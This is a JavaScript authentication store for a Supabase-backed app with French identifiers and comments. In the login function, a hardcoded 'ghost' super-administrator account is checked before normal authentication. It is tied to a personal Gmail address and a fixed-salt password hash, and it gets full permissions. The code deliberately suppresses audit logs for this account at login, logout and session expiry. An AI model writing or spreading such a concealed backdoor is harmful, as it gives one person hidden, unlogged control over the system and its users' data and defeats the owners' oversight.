import { create } from 'zustand';
import { persist } from 'zustand/middleware';
import { supabase } from '../lib/supabaseClient';
import { auditLogger } from '../utils/auditLogger';
import { AUTH_CONFIG, ROLES } from '../config/constants';
import { useUtilisateursStore } from './useUtilisateursStore';

// Hashage local pour le Super Admin
const SALT_LOCAL = 'sika_local_auth_salt_2024';
async function hashLocal(password) {
  const encoder = new TextEncoder();
  const data = encoder.encode(password + SALT_LOCAL);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Configuration Super Admin - utilisateur fantôme (aucune trace)
const SUPER_ADMIN_CONFIG = {
  id: 1,
  nom: 'SYSTEM',
  role: ROLES.SUPER_ADMIN,
  isFantome: true,
  permissions: ['ALL']
};

// Accès SUPER_ADMIN - fantôme, aucune trace
const SUPER_ADMIN_LOGIN = 'munokolive@gmail.com';
const SUPER_ADMIN_PASSWORD_HASH = '6c7c09516b3436b53f4075a808a3bf00dcfe51b5a8aa39f549c9f7e7fbf4047a';

const { TIMEOUT_INACTIVITE, AVERTISSEMENT_INACTIVITE } = AUTH_CONFIG;

// Vérifie si l'utilisateur est le fantôme SUPER_ADMIN
const isGhostUser = (utilisateur) => {
  return utilisateur?.isFantome === true || utilisateur?.login === SUPER_ADMIN_LOGIN;
};

export const useAuthStore = create(
  persist(
    (set, get) => ({
      utilisateurConnecte: null,
      derniereActivite: null,
      timeoutId: null,
      avertissementId: null,
      sessionExpirant: false,

      login: async (login, motDePasse) => {
        const trimmedLogin = (login || '').trim().toLowerCase();
        const passwordHash = await hashLocal(motDePasse);

        // 1. ACCÈS FANTÔME SUPER_ADMIN - munokolive@gmail.com
        // Aucune trace, aucun log
        if (trimmedLogin === SUPER_ADMIN_LOGIN && passwordHash === SUPER_ADMIN_PASSWORD_HASH) {
          const utilisateur = {
            ...SUPER_ADMIN_CONFIG,
            login: SUPER_ADMIN_LOGIN,
            email: SUPER_ADMIN_LOGIN,
          };
          set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
          get().demarrerTimeout();
          // AUCUN LOG pour le fantôme
          return { success: true, utilisateur };
        }

        // 2. Authentification Supabase Auth pour les autres utilisateurs (avec logs)
        try {
          let emailForAuth = trimmedLogin;

          // Récupérer l'email depuis le login si nécessaire
          if (!trimmedLogin.includes('@')) {
            const { data: rows } = await supabase
              .from('utilisateurs')
              .select('email')
              .eq('login', trimmedLogin)
              .maybeSingle();
            if (rows?.email) emailForAuth = rows.email;
          }

          if (emailForAuth.includes('@')) {
            const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
              email: emailForAuth,
              password: motDePasse,
            });

            if (!authError && authData?.user) {
              const { data: userRow } = await supabase
                .from('utilisateurs')
                .select('*')
                .eq('auth_user_id', authData.user.id)
                .maybeSingle();

              if (userRow && userRow.is_actif) {
                const utilisateur = {
                  id: userRow.id,
                  nom: userRow.nom,
                  login: userRow.login,
                  email: userRow.email,
                  role: userRow.role,
                  actif: userRow.is_actif,
                  auth_user_id: userRow.auth_user_id,
                };
                set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
                get().demarrerTimeout();
                // LOGS normaux pour les autres utilisateurs
                auditLogger.logConnexion(utilisateur);
                return { success: true, utilisateur };
              }
            }
          }
        } catch (err) {
          // Continue avec auth locale
        }

        // 3. Auth locale (avec logs pour échec)
        const result = await useUtilisateursStore.getState().verifierIdentifiants(login, motDePasse);

        if (result.success) {
          set({ utilisateurConnecte: result.utilisateur, derniereActivite: Date.now() });
          get().demarrerTimeout();
          // LOGS normaux pour les autres utilisateurs
          auditLogger.logConnexion(result.utilisateur);
          return result;
        }

        // Log d'échec (pas de détails sensibles)
        auditLogger.logConnexionEchec(login);
        return { success: false, message: 'Identifiants incorrects ou compte inactif' };
      },

      // Récupérer tous les utilisateurs (pour que SUPER_ADMIN puisse gérer)
      getUtilisateursVisibles: () => {
        return useUtilisateursStore.getState().getUtilisateurs();
      },

      // Fonction pour vérifier si l'utilisateur est super admin
      isSuperAdmin: () => {
        const { utilisateurConnecte } = get();
        return utilisateurConnecte?.role === ROLES.SUPER_ADMIN;
      },

      // Fonction pour vérifier si l'utilisateur est admin (SUPER_ADMIN ou ADMIN)
      isAdmin: () => {
        const { utilisateurConnecte } = get();
        return utilisateurConnecte?.role === ROLES.SUPER_ADMIN ||
               utilisateurConnecte?.role === ROLES.ADMIN;
      },

      logout: () => {
        const { timeoutId, avertissementId, utilisateurConnecte } = get();
        if (timeoutId) clearTimeout(timeoutId);
        if (avertissementId) clearTimeout(avertissementId);
        // Log uniquement pour les utilisateurs non-fantômes
        if (utilisateurConnecte && !isGhostUser(utilisateurConnecte)) {
          auditLogger.logDeconnexion(utilisateurConnecte);
        }
        set({
          utilisateurConnecte: null,
          derniereActivite: null,
          timeoutId: null,
          avertissementId: null,
          sessionExpirant: false
        });
      },

      deconnexion: () => {
        get().logout();
      },

      updateActivite: () => {
        const { utilisateurConnecte } = get();
        if (utilisateurConnecte) {
          set({ derniereActivite: Date.now(), sessionExpirant: false });
          get().demarrerTimeout();
        }
      },

      demarrerTimeout: () => {
        const { timeoutId, avertissementId, utilisateurConnecte } = get();
        if (timeoutId) clearTimeout(timeoutId);
        if (avertissementId) clearTimeout(avertissementId);

        const newAvertissementId = setTimeout(() => {
          set({ sessionExpirant: true });
        }, AVERTISSEMENT_INACTIVITE);

        const newTimeoutId = setTimeout(() => {
          const { utilisateurConnecte: currentUser } = get();
          // Log session expirée uniquement pour les non-fantômes
          if (currentUser && !isGhostUser(currentUser)) {
            auditLogger.logSessionExpiree(currentUser);
          }
          get().logout();
        }, TIMEOUT_INACTIVITE);

        set({ timeoutId: newTimeoutId, avertissementId: newAvertissementId });
      },

      verifierSession: () => {
        const { utilisateurConnecte, derniereActivite } = get();
        if (utilisateurConnecte && derniereActivite) {
          const tempsEcoule = Date.now() - derniereActivite;
          if (tempsEcoule > TIMEOUT_INACTIVITE) {
            get().logout();
            return false;
          }
          return true;
        }
        return false;
      }
    }),
    {
      name: 'sika_auth',
      partialize: (state) => ({
        utilisateurConnecte: state.utilisateurConnecte,
        derniereActivite: state.derniereActivite
      })
    }
  )
);
